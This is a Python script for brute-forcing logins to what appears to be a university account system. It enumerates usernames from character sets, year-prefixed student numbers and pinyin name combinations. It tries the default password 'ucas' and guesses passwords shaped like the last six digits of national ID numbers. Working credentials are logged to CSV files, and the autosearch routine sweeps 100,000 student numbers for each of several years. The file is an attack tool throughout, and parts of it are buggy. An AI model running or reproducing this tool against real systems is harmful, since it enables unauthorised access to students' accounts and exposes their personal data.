import sys, datetime
from UNP.Core import Account, ActTable


class Searcher:
    def __init__(self, mode="username", start=0, end=100,
                 string="abcdefghijklmnopqrstuvwxyz", list=['ucas']):
        self.mode = str(mode)
        self.start = int(start)
        self.end = int(end)
        self.string = str(string)
        self.list = list
        self._username = ""
        self._password = ""
        self._year = ""

    def __str__(self):
        string = "mode-" + self.mode + "_between-" + str(self.start) + "-" + str(self.end)
        if self.string != " ":
            localstring = self.string
            localstring = localstring.replace("abcdefghijklmnopqrstuvwxyz","a-z")
            localstring = localstring.replace("ABCDEFGHIJKLMNOPQRSTUVWXYZ","A-Z")
            localstring = localstring.replace("0123456789","0-9")
            string = string + "_string-" + localstring
        if self.list != []:
            string = string + "_list-" + str(self.list)
        return string

    def reset(self, mode="username", start=0, end=100,
              string="abcdefghijklmnopqrstuvwxyz", list=['ucas']):
        self.__init__(self, mode=mode, start=start, end=end, string=string, list=list)

    @staticmethod
    def percentage(now, all, tip="Progress: ", info=" "):
        now = now + 1
        percent = 1.0 * int(now) / int(all)
        sys.stdout.write("\r{0}{1}{2}{3}".format(tip,
                                                 "|" * int(percent // 0.05),
                                                 '%.2f%%' % (percent * 100),
                                                 " (" + info + ")"))
        sys.stdout.flush()

    @staticmethod
    def generator(n, charlist):
        charlist = '\n' + charlist
        base = len(charlist)
        string = ""
        while n != 0:
            string = charlist[n % base] + string
            n = n // base
        if '\n' in string:
            string = ""
        return string

    def search(self):
        if self.mode == "auto":
            self.autosearch()
        elif self.mode == "username_NO":
            for year in self.list:
                self._year = year
                self._password = 'ucas'
                self.run()
        elif "username" in self.mode:
            for password in self.list:
                self._password = password
                self.run()
        elif "password" in self.mode:
            for username in self.list:
                self._username = username
                self.run()

    def run(self):
        filename = 'Record_' + str(self) + '_' + \
                   datetime.datetime.now().strftime('%Y-%m-%d-%H-%M') + '.csv'
        actt = ActTable(filename)
        for [now, account] in self.iterator():
            account.load()
            if self.mode != "username_CN":  # 如果不是姓名模式，开启默认进度条
                self.percentage(now, self.end-self.start, info=str(account))
            if self.mode in ["username", "username_CN", "username_NO"]:
                if account.existence:  #如果账号存在
                    actt.record(account)
                    print('\nSuccess! '+ account.username + "|" + account.password)
            if self.mode in ["password", "password_ID"]:
                if account.accessibility:
                    actt.record(account)
                    print('\nSuccess! ' + account.username + "|" + account.password)
                    return
            actt.record(account)  # 失败记录

    def iterator(self):
        if self.mode == "username":
            for now in range(self.start, self.end):
                username = self.generator(now, self.string)
                if username != "":
                    yield [now, Account(username, password=self._password)]
        elif self.mode == "password":
            for now in range(self.start, self.end):
                password = self.generator(now, self.string)
                if password != "":
                    yield [now, Account(self._username, password=password)]
        elif self.mode == "password_ID":  # password_ID mode iterator
            if self.end > 12 ** 6:  # 结束值调整，不超过身份证6位
                self.end == 12 ** 6
            self.string = "0123456789X"
            for now in range(self.start, self.end):
                password = self.generator(now, self.string)
                if password != "":
                    if password[:-1].isdigit():
                        yield [now, Account(self._username, password=password)]
        elif self.mode == "username_NO":  # username_NO mode iterator
            username = self._year + "K80099"
            for now in range(self.start, self.end):
                nowstr = str(now)
                while len(nowstr) < 5:
                    nowstr = "0" + nowstr
                yield [now, Account(username + nowstr, self._password)]
        elif self.mode == "username_CN":
            def iterator_cn(self):  # username_CN mode iterator
                if self.start < 0:  # 开始值调整
                    self.start = 0
                if self.end > 48:  # 结束值调整
                    self.end = 48
                list_sm = ['b', 'p', 'm', 'f', 'd',
                           't', 'n', 'l', 'g', 'k',
                           'h', 'j', 'q', 'x',
                           'zh', 'ch', 'sh', 'r',
                           'z', 'c', 's', 'y', 'w',
                           '']  # 声母表，共24个
                list_ym = ['a', 'o', 'e', 'i', 'u',
                           'v', 'ai', 'ei', 'ui',
                           'ao', 'ou', 'iu', 'ie',
                           've', 'er', 'an', 'en',
                           'in', 'un', 'vn', 'ang',
                           'eng', 'ing', 'ong',
                           'ian', 'uan', 'van',
                           'uen', 'iang', 'uang',
                           'ueng', 'iong']  # 韵母表，共32个
                for n_sm in self.progression_iter():
                    for n_ym in range(0, 32):
                        for n_name in range(0, 729):  # 0到27的平方
                            name_given = self.generator(n_name, 'abcdefghijklmnopqrstuvwxyz')
                            if n_sm < 24:  # 如果声母数量正常
                                name_sur = list_sm[n_sm] + list_ym[n_ym]
                                username = name_sur + name_given
                            else:  # 如果声母数量超出24，修改姓名顺序
                                name_sur = list_sm[n_sm - 24] + list_ym[n_ym]
                                username = name_given + name_sur
                            if n_name == 0 or n_name != "":
                                self.percentage(n_ym * 729 + n_name, 32 * 729, info=username)
                                yield [n_sm, Account(username, self._password)]

    def progression_iter(self):
        for now in range(self.start, self.end):
            if now != self.start:
                print("")  # 防止刷新到进度条上，增加一个空行
            print("Total progression: " + str(now) +
                  " in range(" + str(self.start) + ", " + str(self.end) + ")")
            print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
            yield now

    def autosearch(self):
        for now in self.progression_iter():
            string = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
            string = string + "`~!@#$%^&*()-=_+[]{}|;:,./<>?"
            if now == 0:  # test traditional searcher
                Searcher("username", 0, 50, string).search()
                print("\ntest usr complete")
            elif now == 1:  # test number searcher
                Searcher("username_NO", 0, 50, " ", ["2015", "2016"]).search()
                print("\ntest usr_NO complete")
            elif now == 2:  # test chinese name searcher
                Searcher("username_CN", 0, 1).search()
                print("\ntest usr_CN complete")
            elif now == 3:  # test id password searcher
                Searcher("password_ID", 0, 50, list=["2016K8009909003"]).search()
                print("\ntest usr_NO complete")
            elif now == 4:
                Searcher("username_NO", 0, 100000, " ", ["2016"]).search()
            elif now == 5:
                Searcher("username_NO", 0, 100000, " ", ["2015"]).search()
            elif now == 6:
                Searcher("username_NO", 0, 100000, " ", ["2014"]).search()